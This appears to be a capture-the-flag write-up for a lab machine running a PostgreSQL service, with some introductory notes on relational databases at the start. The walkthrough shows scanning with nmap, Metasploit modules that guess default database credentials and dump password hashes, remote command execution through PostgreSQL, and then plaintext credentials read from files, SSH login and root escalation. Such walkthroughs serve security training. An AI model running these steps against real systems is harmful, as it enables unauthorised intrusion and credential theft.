
# Trivia

Depending on the EF Codd relational model, an RDBMS allows users to build,
update, manage, and interact with a relational database,
which stores data as a table.

Today, several companies use relational databases
instead of flat files or hierarchical databases to store business data.
This is because a relational database can handle a
wide range of data formats and process queries efficiently.
In addition, it organizes data into tables that can be linked internally
based on common data. This allows the user
to easily retrieve one or more tables with a single query.
On the other hand, a flat file stores data in a single table structure,
making it less efficient and consuming more space and memory.  

Most commercially available RDBMSs currently use Structured Query Language (SQL)
to access the database.
RDBMS structures are most commonly used to perform CRUD operations
(create, read, update, and delete),
which are critical to support consistent data management.  

#### Types of databases

- Centralised database.
- Distributed database.
- Personal database.
- End-user database.
- Commercial database.
- NoSQL database.
- Operational database.
- Relational database.
- Cloud database.
- Object-oriented database.
- Graph database.

# Scanning and Enumeration

Doing an nmap scan:

```bash
nmap -p- -A -T4 10.10.127.152
```

Output:  

```bash
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 71:ed:48:af:29:9e:30:c1:b6:1d:ff:b0:24:cc:6d:cb (RSA)
|   256 eb:3a:a3:4e:6f:10:00:ab:ef:fc:c5:2b:0e:db:40:57 (ECDSA)
|_  256 3e:41:42:35:38:05:d3:92:eb:49:39:c6:e3:ee:78:de (ED25519)
80/tcp   open  http       Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Poster CMS
5432/tcp open  postgresql PostgreSQL DB 9.5.8 - 9.5.10
| ssl-cert: Subject: commonName=ubuntu
| Not valid before: 2020-07-29T00:54:25
|_Not valid after:  2030-07-27T00:54:25
|_ssl-date: TLS randomness does not represent time

Aggressive OS guesses: Linux 3.10 - 3.13 (95%)
```

Searching in msfconsole for postgresql I find an auxiliary module that
lets us enumerate user credential called
**/auxiliary/scanner/postgres/postgres_login**  

```bash
msf5> use auxiliary/scanner/postgres/postgres_login
> set rhosts 10.10.127.152
> run
```

Output:  

```bash
postgres:password@template1
```

Searching again in msfconsole for postgresql I find an auxiliary module that
allows you to execute commands with user creds named
**/auxiliary/scanner/postgres/postgres_sql**  

```bash
msf5> use auxiliary/admin/postgres/postgres_sql
> set password password
> set rhosts 10.10.127.152
> run
```

We get the version: **9.5.21**  

Output:  

```bash
PostgreSQL 9.5.21 on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609, 64-bit
```

Lets know dump user hashes. Again with metasploit
**auxiliary/scanner/postgres/postgres_hashdump**

```bash
msf5> use auxiliary/scanner/postgres/postgres_hashdump
> set password password
> set rhosts 10.10.127.152
> run
```

Output:

```bash
Username   Hash
 --------   ----
 darkstart  md58842b99375db43e9fdf238753623a27d
 poster     md578fb805c7412ae597b399844a54cce0a
 postgres   md532e12f215ba27cb750c9e093ce4b5127
 sistemas   md5f7dbc0d5a06653e74da6b1af9290ee2b
 ti         md57af9ac4c593e9e4f275576e13f935579
 tryhackme  md503aab1165001c8f8ccae31a8824efddc
```

We can read files with **auxiliary/admin/postgres/postgres_readfile**  
And we can get RCE with
**exploit/multi/postgres/postgres_copy_from_program_cmd_exec**  

# Exploitation

```bash
msf5> use exploit/multi/postgres/postgres_copy_from_program_cmd_exec
> set password password
> set rhosts 10.10.127.152
> run
```

We get a shell and then

```bash
cat /home/dark/credentials.txt
dark:qwerty1234#!hackme
```

SSH in the machine

```bash
ssh dark@10.10.127.152
```

After some failed attempts to enumerate I found some interesting stuff

```bash
cat /var/www/html/config.php

$dbhost = "127.0.0.1";
$dbuname = "alison";
$dbpass = "p4ssw0rdS3cur3!#";
$dbname = "mysudopassword";

su alison
cat /home/alison/user.txt
sudo su
cat /root/root.txt
```

